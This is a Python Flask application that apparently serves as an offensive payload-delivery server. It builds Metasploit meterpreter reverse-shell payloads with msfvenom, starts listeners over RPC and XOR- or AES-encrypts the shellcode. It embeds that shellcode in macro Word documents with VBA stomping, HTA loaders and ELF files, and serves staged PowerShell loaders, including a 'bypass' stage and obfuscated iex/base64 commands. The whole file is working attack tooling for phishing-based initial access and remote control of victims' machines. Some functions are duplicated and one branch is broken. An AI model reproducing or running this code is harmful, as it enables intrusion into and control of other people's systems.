from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
from pathlib import Path
import base64
import hashlib
import ipaddress
import itertools
import json
import logging
import os
import re
import subprocess
import sys
from typing import Optional, Dict, List, Tuple
import olefile
from io import BytesIO
import hashlib
import json
import logging
import os
import subprocess
from time import sleep
from typing import Optional, List, Dict
import base64
import random
from flask import request
from pymetasploit3.msfrpc import MsfRpcClient
from pprint import pprint

from flask import Flask, render_template, Blueprint, render_template_string, request, send_from_directory, send_file, \
    current_app, redirect

from logging.config import dictConfig

from pymetasploit3.msfrpc import MsfRpcClient

# import vba
# from hta import create_hta
# from payload import LISTENER_CONFIGS, generate_payload, get_host, PAYLOAD_DIR, setup_listener
# from powershell import encode_ps, powershell_base64

import binascii
import itertools
import logging
import os
import struct
import binascii
from io import BytesIO
from typing import Optional, List

from olefile import olefile
from oletools.olevba import decompress_stream, copytoken_help
from pcodedmp.pcodedmp import getWord, getDWord

logger = logging.getLogger(__name__)

SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}

EGG_START = b"START_AES_HERE_"
EGG_END = b"_END_AES_HERE"

PWD_START = b"PASSWORD_START_"
PWD_END = b"_PASSWORD_STOP"

SALT_HEADER = b"Salted__"


first_PADDING = b"\x00"
rest_PADDING = b"\x20"


PAYLOAD_DIR = "payloads"


BASIC_LISTENER_CONFIG = {
    "PingbackSleep": 10,
    "OverrideRequestHost": True,
    "ReverseListenerBindAddress": "127.0.0.1",
    "ReverseListenerBindPort": 50000,
}


LISTENER_CONFIGS = {
    "PS_HTTPS": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "PS_TCP": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_tcp"
    },
    "VBA_32": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "VBA_64": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "ELF": BASIC_LISTENER_CONFIG | {
        "Payload": "linux/x64/meterpreter_reverse_https"
    },
}
pprint(LISTENER_CONFIGS)


BASIC_LISTENER_CONFIG = {
    "PingbackSleep": 10,
    "OverrideRequestHost": True,
    "ReverseListenerBindAddress": "127.0.0.1",
    "ReverseListenerBindPort": 50000,
}


# Base payloads without architecture
CFGS = [
    "windows/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_winhttps",
    "linux/meterpreter_reverse_https",
    "windows/pingback_reverse_tcp",
    "windows/messagebox",
]

LISTENER_CONFIGS = {}

for cfg in CFGS:
    parts = cfg.split('/')
    platform = parts[0]
    payload = "/".join(parts[1:])  # e.g. meterpreter/reverse_tcp or pingback_reverse_tcp

    key = cfg.replace('/', '_')  # Group configs by payload type

    LISTENER_CONFIGS[key] = {}
    for arch in (32, 64):
        # Build full payload path based on arch
        full_payload = f"{platform}/x{arch}/{payload}"
        if arch == 32:
            full_payload = f"{platform}/{payload}"

        # Build config
        LISTENER_CONFIGS[key][arch] = BASIC_LISTENER_CONFIG | {
            "Payload": full_payload,
        }

        # Optionally set HttpProxyIE based on payload characteristics
        if "winhttps" in full_payload:
            LISTENER_CONFIGS[key][arch]["HttpProxyIE"] = False

# Print for inspection
pprint(LISTENER_CONFIGS)



msf_client = None

with open('./PASSWORD_MsfRpcClient.txt', 'r') as f:
    PASSWORD_MsfRpcClient = f.read().strip()

with open('templates/WIN_PS_COMMAND.ps1', 'r') as f:
    WIN_PS_COMMAND = f.read().strip()

with open('templates/WIN_START.ps1', 'r') as f:
    WIN_START_TEMPLATE = f.read().strip()

with open('templates/WIN_BYPASS.ps1', 'r') as f:
    WIN_BYPASS_TEMPLATE = f.read().strip()

with open('templates/WIN_LOADER_32.ps1', 'r') as f:
    WIN_LOADER_32_TEMPLATE = f.read().strip()

with open('templates/WIN_DELEGATE.ps1', 'r') as f:
    WIN_DELEGATE_TEMPLATE = f.read().strip()

with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
    WIN_VBA_OUT_TEMPLATE = f.read().strip()






win = Blueprint('win', __name__)
lin = Blueprint('lin', __name__)
info = Blueprint('info', __name__)



def findmarker(content):
    marker = ("A" * 100).encode()
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find("!".encode(), offset + len(marker))
        if offset_end != -1:
            return offset, offset_end - offset

    return -1, 0


def findmarker_old(content):
    marker = b''.join(bytes([0xAC, 0x00, int(c, 16), 0x00])
                      for c in "DEADBEEFCAFEBABE")
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(marker, offset + len(marker))
        if offset_end != -1:
            return offset, ((offset_end + len(marker)) - offset) // 4

    return -1, 0


def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    # stream.read(length * 4)
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    contents = contents[:offset] + encrypted_bytes_instructions + \
        contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    # new_bytes = stream.read(length * 4)
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    print(old_bytes)
    print(new_bytes)

    return contents


def get_vba_offsets(contents):
    offset = 0

    vba_offsets = {}

    module_name = ""
    module_offset = 0

    while offset < len(contents):
        tag = getWord(contents, offset, '<')
        wLength = getDWord(contents, offset + 2, '<')

        if tag == 9:
            wLength = 6
        elif tag == 3:
            wLength = 2

        match tag:
            case 26:
                module_name = contents[offset +
                                       6:offset + 6 + wLength].decode('utf-8')
                print(f"Module name: {module_name}")
            case 49:
                module_offset = getDWord(contents, offset + 6, '<')
                print(f"Module offset: {module_offset}")
                vba_offsets[module_name] = module_offset

        offset += 6
        offset += wLength

    return vba_offsets


def open_word_template(template_path: str):
    with open(template_path, 'rb') as file:
        template_file = file.read()

    file_data = BytesIO(template_file)
    ole = olefile.OleFileIO(file_data, write_mode=True)

    # Parse the VBA dir to get a hold of the offsets
    if not ole.exists("Macros/VBA/dir"):
        logger.error(f"OLE dir Macros/VBA/dir does not exist")
        return None, None

    return file_data, ole


def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
    file_data, ole = open_word_template(template_path)

    for x in encrypted_payloads:
        print(len(x))
        print(f"{(len(x)):04X}")
        print(','.join(str(b) for b in x))

    data_to_write = (''.join(map(
        lambda x: f"{(len(x)):04X}{binascii.hexlify(x).decode().upper()}", encrypted_payloads))).encode()

    if not file_data:
        return None

    contents = ole.openstream("WordDocument").read()
    offset, length = findmarker(contents)

    if offset != -1:
        logger.info(
            f"Marker found in document at: [{offset}] length: [{length}]")

        if length < len(data_to_write):
            logger.error(
                f"Payload is too big for document! ({len(data_to_write)} > {length})")
            return None

        contents = replacemarker(contents, offset, data_to_write)
        ole.write_stream(f"WordDocument", contents)

    if stomp_vba:
        dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())

        module_offsets = get_vba_offsets(dir_stream)

        # We have messed up the mapping between modules and OLE paths using EvilClippy, so pick the largest offset and put it in NewMacros
        biggest_offset = sorted(module_offsets.items(),
                                key=lambda x: x[1], reverse=True)[0][1]
        contents = ole.openstream(f"Macros/VBA/NewMacros").read()
        contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
        ole.write_stream(f"Macros/VBA/NewMacros", contents)

        # for directory, vba_offset in module_offsets.items():
        #     contents = ole.openstream(f"Macros/VBA/{directory}").read()
        #     contents = contents[:vba_offset].ljust(len(contents), b'\x00')
        #     ole.write_stream(f"Macros/VBA/{directory}", contents)

    ole.close()
    file_data.seek(0)

    return file_data


def powershell_base64(command):
    command_bytes = command.encode('utf-16le')
    base64_encoded = base64.b64encode(command_bytes)
    return base64_encoded.decode('ascii')


def regular_base64(command):
    command_bytes = command.encode('utf-8')
    base64_encoded = base64.b64encode(command_bytes)
    return base64_encoded.decode('ascii')


def random_capitalize(input_string):
    result = ""
    for char in input_string.lower():
        if char.isalpha():
            if random.choice([True, False]):
                result += char.upper()
            else:
                result += char.lower()
        else:
            result += char

    return result


def encode_ps(command):
    return f"{random_capitalize("iex")}([{random_capitalize("System.Text.Encoding")}]::{random_capitalize("UTF8.GetString")}([{random_capitalize("System.Convert")}]::{random_capitalize("FromBase64String")}('{regular_base64(command)}')))"


def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
    marker_url = 'http://111.111.111.111:12345/p/info/get?pad=a'.encode()
    replacement_url = url.ljust(len(marker_url), 'a').encode()

    file_data, ole = open_word_template(template_path)

    if not file_data:
        return None

    summary_stream = ole.openstream("\x05SummaryInformation").read()

    if summary_stream.find(marker_url) != -1:
        edited_summary = summary_stream.replace(marker_url, replacement_url)

        print(binascii.binascii.hexlify(summary_stream))
        print(binascii.binascii.hexlify(edited_summary))

        ole.write_stream("\x05SummaryInformation", edited_summary)

    ole.close()
    file_data.seek(0)

    return file_data



def findmarker(content):
    marker = (b"\x41" * 100)
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(b"\x21", offset + len(marker))
        if offset_end != -1:
            return offset, (offset_end - offset)

    return -1, 0


def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    # stream.read(length * 4)
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    contents = contents[:offset] + encrypted_bytes_instructions + \
        contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    # new_bytes = stream.read(length * 4)
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    print(old_bytes)
    print(new_bytes)

    return contents


def create_hta(encypted_bytes):
    with open("payload_holders/hta_library", 'rb') as f:
        contents = f.read()

    offset, length = findmarker(contents)

    if length < len(encypted_bytes):
        logger.error(
            f"Payload is too big for document! ({len(encypted_bytes)} > {length})")
        return None

    contents = replacemarker(contents, offset, encypted_bytes)

    return contents

try:
    msf_client = MsfRpcClient(PASSWORD_MsfRpcClient, username='python', port=55555)
except Exception as e:
    logger.error("COULD NOT CONNECT TO MsfRpcClient")
    logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")


def generate_payload_hash(payload_props):
    param_string = json.dumps(payload_props, sort_keys=True)
    hash_obj = hashlib.sha256(param_string.encode())
    return hash_obj.hexdigest()


def generate_payload_props(payload_name: str,
                           lhost: Optional[str],
                           lport: Optional[int],
                           format: str,
                           additional_props: Optional[List[Dict[str, str]]] = None
                           ):
    if lhost is not None and lport is not None:
        additional_props = [{
            'lhost': lhost,
            'lport': lport,
        }] + (additional_props or [])

    return {
        'payload': payload_name,
        'format': format,
        'additional': additional_props or []
    }


def generate_payload(
    payload_name: str,
    lhost: Optional[str],
    lport: Optional[int],
    format: str,
    additional_props: Optional[List[Dict[str, str]]] = None
) -> str:
    params = generate_payload_props(
        payload_name, lhost, lport, format, additional_props)
    file_hash = generate_payload_hash(params)

    output_file_name = f"{file_hash}.{format}"
    output_path = f"{PAYLOAD_DIR}/{output_file_name}"

    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    if os.path.exists(output_path):
        return output_file_name

    command = [
        'msfvenom',
        '-p', payload_name,
        '-f', format
    ]

    for propset in params['additional']:
        for key, value in propset.items():
            command.append(f"{key}={value}")

    try:
        print(f"Generating payload: {command}")

        result = subprocess.run(
            command,
            capture_output=True,
            text=False,
            check=True
        )

        with open(output_path, 'wb') as f:
            f.write(result.stdout)

        return output_file_name

    except subprocess.CalledProcessError as e:
        raise Exception(f"Payload generation failed: {e.stderr.decode()}")
    except Exception as e:
        raise Exception(f"Error generating payload: {str(e)}")


def get_host():
    host = request.headers['Incoming']

    if ':' in host:
        return host.split(':')[0], int(host.split(':')[1])
    else:
        return host, 443


def get_str(item):
    if type(item) == str:
        return item

    if type(item) == bool:
        return str(item).lower()

    if type(item) == int:
        return str(item)


def setup_listener(lhost, lport, config):
    if not msf_client:
        print(f"Not setting up listener for [{lhost}:{lport}]/[{config}]")
        return

    listener_config = config | {
        "LHOST": lhost,
        "LPORT": lport,
    }

    for job_id, job in msf_client.jobs.list.items():
        if job != 'Exploit: multi/handler':
            continue

        job_info = msf_client.jobs.info(job_id)

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            if config_name not in job_info['datastore'].keys():
                print(
                    f"Config {config_name} missing from [{job_info['datastore'].keys()}]")
                break

            if get_str(job_info['datastore'][config_name]) != get_str(config_value):
                print(
                    f"Config {config_name} mismatch in [{job_info['datastore'][config_name]}] != [{get_str(config_value)}]")
                break
        else:
            # This line is hit if all configs match
            print(f"Reusing the config: [{lhost}:{lport}]/[{config}]")
            break
    else:
        # This line is hit if no matching jobs were found
        logger.info(
            f"No matching listeners found for [{lhost}, {lport}, {config}]")

        print(f"No matching listeners found for [{lhost}, {lport}, {config}]")

        handler = msf_client.modules.use('exploit', 'multi/handler')
        payload = msf_client.modules.use('payload', listener_config['Payload'])

        handler["ExitOnSession"] = False

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            payload[config_name] = config_value

        if len(handler.missing_required) > 0:
            print(
                f"Handler missing required configs: {handler.missing_required}")
        elif len(payload.missing_required) > 0:
            print(
                f"Payload missing required configs: {payload.missing_required}")
        else:
            print(f"Starting listener for [{lhost}, {lport}]")

            config_str = "\n".join(map(lambda t: f"{t[0]}: {t[1]}", list(
                listener_config.items()) + [("ExitOnSession", False)]))
            print(config_str)

            job_id = handler.execute(payload=payload)

            print(f"Started job id {job_id}")

            sleep(1)


dictConfig({
    'version': 1,
    'formatters': {'default': {
        'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
    }},
    'handlers': {'wsgi': {
        'class': 'logging.StreamHandler',
        'stream': 'ext://flask.logging.wsgi_errors_stream',
        'formatter': 'default'
    }},
    'root': {
        'level': 'INFO',
        'handlers': ['wsgi']
    }
})


def filter_string(input_string):
    return re.sub(r'[^a-zA-Z0-9_-]', '', input_string)


def filter_int(input_string):
    return int(re.sub(r'[^0-9]', '', input_string))


def encrypt_ps_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    for byte in content:
        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'0x{transformed_byte:02X},'

    # Remove trailing comma
    return transformed.rstrip(',')


def encrypt_vba_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    i = 0
    for byte in content:
        if i % 50 == 0 and i != 0:
            transformed += " _\n"

        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'{transformed_byte:d},'

        i += 1

    # Remove trailing comma
    return transformed.rstrip(',')


def encrypt_raw_payload(payload_file: str) -> bytearray:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = bytearray(f.read())

        for i in range(len(content)):
            content[i] = (((content[i] + 2) & 0xFF) ^ 0x75)

        return content


def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
    for i in range(len(payload)):
        payload[i] = (((payload[i] + 2) & 0xFF) ^ 0x75)

    return payload


def ps(id, stage, proxy=False):
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if proxy:
        payload_type = "ps_proxy"
    else:
        payload_type = "ps"

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'delegate':
        payloads_generated = gen_multiple_payloads(
            lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[64]
        )
        payload_x64 = encrypt_ps_payload(payloads_generated[64])
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=payload_x64)


@win.route('/ps/<id>/<stage>')
def ps_noproxy(id, stage):
    return ps(id, stage)


@win.route('/ps_proxy/<id>/<stage>')
def ps_proxy(id, stage):
    return ps(id, stage, proxy=True)


@win.route('/ps/get_command', methods=['POST'])
def ps_get_command():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    proxy = ('system_proxy' in request.form.keys())

    if proxy:
        ps_type = "ps_proxy"
    else:
        ps_type = "ps"

    command_text = render_template_string(
        WIN_PS_COMMAND,
        lhost=lhost,
        lport=lport,
        id=id,
        type=ps_type,
        proxy=proxy
    ).strip()

    encoded_command = encode_ps(command_text)

    return command_text + "\n\n" + encoded_command + "\n\n" + powershell_base64(encoded_command)


@win.route('/tcp/<id>/<stage>')
def tcp(id, stage):
    clean_id = filter_int(id)

    if clean_id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type='tcp')

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type='tcp')

    if stage == 'delegate':
        setup_listener(
            lhost,
            clean_id,
            LISTENER_CONFIGS["PS_TCP"]
        )

        raw_payload_file = generate_payload(
            LISTENER_CONFIGS["PS_TCP"]["Payload"],
            lhost,
            clean_id,
            'raw',
            [

            ]
        )
        ps_string = encrypt_ps_payload(raw_payload_file)
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)




def get_ip(adapter: str) -> str:
    if adapter not in SAFE_ADAPTERS:
        adapter = "tun0"
    try:
        return os.popen(
            f"ip a s {adapter} | grep 'inet ' | awk '{{print $2}}' | sed 's/\\/.*//g'"
        ).read().strip()
    except Exception:
        return ""


@win.route('/')
def word_form():
    import os
    template = render_template('1_win_form.html')
    ladapter = request.args.get('ladapter', '')
    lport = request.args.get('lport', 80)
    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
    print(f"{ladapter=}")
    print(f"{lport=}")
    print(f"{uid=}")
    template = template.replace(
        'name="lhost" value=""', f'name="lhost" value="{get_ip(ladapter)}"')
    template = template.replace(
        'name="lport" value=""', f'name="lport" value="{str(lport)}"')
    template = template.replace(
        'name="id" value=""', f'name="id" value="{str(uid)}"')
    return template


def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]):
    retval = {}
    print(f"{archs=}")
    for arch in archs:
        endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
        print(f"{config=}")
        print(f"{endpoint_msfvenom=}")
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS[config][arch] | {
                "LURI": endpoint_msfvenom,
                "HttpProxyIE": proxy,
            }
        )
        a = generate_payload(
            LISTENER_CONFIGS[config][arch]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": endpoint_msfvenom,
                    "HttpProxyIE": proxy,
                }
            ]
        )
        retval[arch] = a
    return retval


def msgbox_generator(archs=[32, 64]):
    retval = {}
    for i in archs:
        payload = "windows/x64/messagebox"
        if archs == 32:
            payload = "windows/messagebox"
        retval[i] = generate_payload(
            payload,
            None,
            None,
            'raw',
            [
                {
                    "Title": f"{str(i)} bit"
                }
            ]
        )
    return retval




def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
    salt = get_random_bytes(8)
    key_iv = PBKDF2(password.encode(), salt, dkLen=48,
                    count=10_000, hmac_hash_module=SHA256)
    key, iv = key_iv[:32], key_iv[32:]

    pad_len = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad_len]) * pad_len

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)

    return base64.b64encode(SALT_HEADER + salt + encrypted)


def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, password: str):
    doc_data = doc_path.read_bytes()
    raw_shellcode = shellcode_path.read_bytes()

    print(
        f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")

    b64_payload = openssl_pbkdf2_encrypt(raw_shellcode, password)

    egg_start_idx = doc_data.find(EGG_START)
    if egg_start_idx == -1:
        raise ValueError("START_AES_HERE marker not found")
    egg_end_idx = doc_data.find(EGG_END, egg_start_idx)
    if egg_end_idx == -1:
        raise ValueError("_END_AES_HERE marker not found")

    egg_region_len = egg_end_idx - egg_start_idx
    if len(b64_payload) > egg_region_len:
        raise ValueError(
            f"Encrypted payload ({len(b64_payload)} B) exceeds region ({egg_region_len} B)"
        )

    padded_payload = b64_payload + first_PADDING + \
        rest_PADDING * (egg_region_len - len(b64_payload) - 1)
    patched = (
        doc_data[:egg_start_idx]
        + padded_payload
        + doc_data[egg_end_idx:]
    )

    b64_pass = base64.b64encode(password.encode())

    pwd_start_idx = patched.find(PWD_START)
    if pwd_start_idx == -1:
        raise ValueError("PASSWORD_START_ marker not found")
    pwd_end_idx = patched.find(PWD_END, pwd_start_idx)
    if pwd_end_idx == -1:
        raise ValueError("_PASSWORD_STOP marker not found")

    pwd_region_start = pwd_start_idx
    pwd_region_end = pwd_end_idx + len(PWD_END)
    pwd_region_len = pwd_region_end - pwd_region_start

    if len(b64_pass) > pwd_region_len:
        raise ValueError(
            f"Base‑64 password ({len(b64_pass)} B) exceeds region ({pwd_region_len} B)"
        )

    padded_b64_pass = b64_pass + first_PADDING + \
        rest_PADDING * (pwd_region_len - len(b64_pass) - 1)
    patched = (
        patched[:pwd_region_start]
        + padded_b64_pass
        + patched[pwd_region_end:]
    )

    out_path.write_bytes(patched)

    print(
        f"[+] Patched '{out_path}'. Inserted {len(b64_payload)}‑byte payload "
        f"and embedded {len(b64_pass)}‑byte password (region sizes preserved)."
    )


def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, arch: int = 32, proxy: bool = False) -> bytes:
    """
    Genereer AES-versleutelde payload (Base64) op basis van ID, arch, host, etc.
    """
    clean_id = filter_string(id)
    if clean_id == "":
        raise ValueError("Invalid id")

    payloads = gen_multiple_payloads(
        lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[arch]
    )

    raw_bytes = payloads[arch]
    if isinstance(raw_bytes, str):
        with open(f"{PAYLOAD_DIR}/{raw_bytes}", 'rb') as f:
            raw_bytes = f.read()

    return openssl_pbkdf2_encrypt(raw_bytes, password)


@win.route('/aes/get', methods=['GET', 'POST'])
def aes_payload():
    password = request.args.get('password')
    lhost = request.args.get('lhost')
    lport = int(request.args.get('lport'))
    architecture = int(request.args.get('architecture', 32))
    id = request.args.get('id')
    proxy = ('system_proxy' in request.form.keys()
             or 'system_proxy' in request.args.keys())

    if not all([password, lhost, lport, id]):
        return "Missing parameters", 400

    try:
        encrypted_blob = generate_encrypted_payload(
            id=id,
            lhost=lhost,
            lport=lport,
            password=password,
            arch=architecture,
            proxy=proxy
        )
        return encrypted_blob
    except Exception as e:
        return str(e), 500


def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool = False) -> Optional[BytesIO]:
    """
    Patch a Word document using AES encryption. The first entry in `encrypted_payloads` must be a bytes blob or filename.
    """
    from tempfile import NamedTemporaryFile
    import uuid

    payload_entry = encrypted_payloads[0]

    if isinstance(payload_entry, str):
        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
            shellcode = f.read()
    elif isinstance(payload_entry, bytes):
        shellcode = payload_entry
    else:
        raise ValueError("Unsupported shellcode payload type")

    password = str(uuid.uuid4()).replace('-', '')

    with NamedTemporaryFile(delete=False) as shellcode_file:
        shellcode_path = Path(shellcode_file.name)
        shellcode_file.write(shellcode)

    doc_path = Path(template_path)
    with NamedTemporaryFile(delete=False) as output_file:
        output_path = Path(output_file.name)

    patch_document(doc_path, shellcode_path, output_path, password)

    with open(output_path, 'rb') as f:
        patched_data = f.read()

    return BytesIO(patched_data)



@win.route('/word_form/get', methods=['POST'])
def word_get():
    payload_type = request.form['type']
    stomp_vba = ('stomp_vba' in request.form.keys())
    proxy = ('system_proxy' in request.form.keys())
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    if payload_type == "vba_shellcode":
        payloads = gen_multiple_payloads(
            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64])
        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
        word_file_stream = generate_word_file(
            template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
    elif payload_type == "aes_shellcode_revshell":
        payloads = gen_multiple_payloads(
            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
        )
        
        payload_path_32 = f"{PAYLOAD_DIR}/{payloads[32]}"
        with open(payload_path_32, "rb") as f:
            payload_bytes_32 = f.read()

        template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
        word_file_stream = generate_word_file_aes(
            template_path, [payload_bytes_32], stomp_vba
        )

    elif payload_type == "aes_shellcode_pingback":
        payloads = gen_multiple_payloads(
            lhost, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
        )
        encrypted_bytes_32 = payloads[32]
        encrypted_bytes_64 = payloads[64]
        template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
    else:
        return "Invalid type", 400

    return send_file(
        word_file_stream,
        as_attachment=False,
        download_name=f'{id}.doc',
        mimetype='application/octet-stream'
    )


@win.route('/hta/get', methods=['POST'])
def hta_get():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    proxy = ('system_proxy' in request.form.keys())
    id = request.form['id']
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    payloads_generated = gen_multiple_payloads(
        lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
    )

    payload_x32 = base64.b64encode(
        encrypt_raw_payload(payloads_generated[32])
    ).decode()
    payload_x64 = base64.b64encode(
        encrypt_raw_payload(payloads_generated[64])
    ).decode()

    hta = render_template(
        "loader.hta",
        payload_x64=payload_x64,
        payload_x32=payload_x32
    )

    bytes_data = hta.encode('utf-8')
    bytes_io = BytesIO(bytes_data)
    bytes_io.seek(0)

    return send_file(
        bytes_io,
        as_attachment=False,
        download_name=f"{clean_id}.hta",
        mimetype='application/octet-stream'
    )



@lin.route('/')
def lin_form():
    import os
    template = render_template('1_lin_form.html')
    ladapter = request.args.get('ladapter', '')
    lport = request.args.get('lport', 80)
    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
    print(f"{ladapter=}")
    print(f"{lport=}")
    print(f"{uid=}")
    template = template.replace(
        'name="lhost" value=""', f'name="lhost" value="{get_ip(ladapter)}"')
    template = template.replace(
        'name="lport" value=""', f'name="lport" value="{str(lport)}"')
    template = template.replace(
        'name="id" value=""', f'name="id" value="{str(uid)}"')
    return template



# @lin.route('/elf/<id>/msf.elf')
# def elf(id):
#     clean_id = filter_string(id)

#     if clean_id == "":
#         return "Invalid id", 400

#     lhost, lport = get_host()

#     setup_listener(
#         lhost,
#         lport,
#         LISTENER_CONFIGS["ELF"] | {
#             "LURI": f"/ms/{clean_id}/"
#         }
#     )

#     elf_payload_file = generate_payload(
#         LISTENER_CONFIGS["ELF"]["Payload"],
#         lhost,
#         lport,
#         'elf',
#         [
#             {
#                 "LURI": f"/ms/{clean_id}/",
#                 "PrependFork": "true"
#             }
#         ]
#     )

#     return send_from_directory(directory=PAYLOAD_DIR, path=elf_payload_file, as_attachment=True, download_name='msf.elf')

@lin.route('elf/get', methods=['POST'])
def generate_elf():
    lhost = request.form.get("lhost", "").strip()
    lport = request.form.get("lport", "").strip()
    clean_id = filter_string(request.form.get("id", "").strip())

    if not lhost or not lport or not clean_id:
        return "Missing parameters", 400

    setup_listener(
        lhost,
        lport,
        LISTENER_CONFIGS["ELF"] | {
            "LURI": f"/ms/{clean_id}/"
        }
    )

    elf_payload_file = generate_payload(
        LISTENER_CONFIGS["ELF"]["Payload"],
        lhost,
        lport,
        'elf',
        [
            {
                "LURI": f"/ms/{clean_id}/",
                "PrependFork": "true"
            }
        ]
    )

    return send_from_directory(
        directory=PAYLOAD_DIR,
        path=elf_payload_file,
        as_attachment=True,
        download_name='msf.elf'
    )




@info.route('/get', methods=['GET', 'POST'])
def receive_info():
    if request.form:
        current_app.logger.info(f"Received info: {request.form}")

    return "Thanks", 200


app = Flask(__name__)
app.register_blueprint(win, url_prefix='/p/win')
app.register_blueprint(lin, url_prefix='/p/lin')
app.register_blueprint(info, url_prefix='/p/info')

print(app.url_map)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=50101, debug=True)
